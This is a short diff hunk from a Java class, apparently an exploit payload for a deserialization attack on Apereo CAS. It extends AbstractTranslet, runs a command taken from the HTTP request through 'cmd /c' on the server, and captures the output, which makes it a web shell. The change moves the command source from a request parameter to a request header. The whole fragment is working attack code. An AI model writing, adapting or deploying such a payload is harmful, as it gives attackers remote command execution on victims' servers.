@@ -30,7 +30,7 @@ public class Apereo_win extends AbstractTranslet implements Serializable {
             HttpServletResponse httpresponse = (HttpServletResponse) response;
 
 
-            InputStream in = Runtime.getRuntime().exec(new String[]{"cmd", "/c", httprequest.getParameter("c")}).getInputStream();
+            InputStream in = Runtime.getRuntime().exec(new String[]{"cmd", "/c", httprequest.getHeader("c")}).getInputStream();
 
             Scanner scan = new Scanner(in).useDelimiter("\\A");
             String d = scan.hasNext() ? scan.next() : "";
